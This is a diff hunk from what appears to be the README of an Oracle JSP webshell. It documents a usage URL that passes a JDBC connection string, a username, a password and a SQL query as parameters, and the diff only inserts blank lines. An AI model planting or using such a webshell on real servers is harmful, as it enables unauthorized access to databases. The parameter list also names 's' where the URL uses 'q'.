@@ -19,8 +19,11 @@ It allows you to connect with oracle database using connection string, username 
 http://target.com/oracle-webshell.jsp?u=connection-string&n=user-name&p=password&q=SQL-query
 
 u : Connection String : jdbc:oracle:thin:@172.23.1.88:1521:sid
+
 n : User Name : root
+
 p : Password : root
+
 s : SQL query : SELECT 1 FROM DUAL
 
 replace u, n, p and s according toyour need
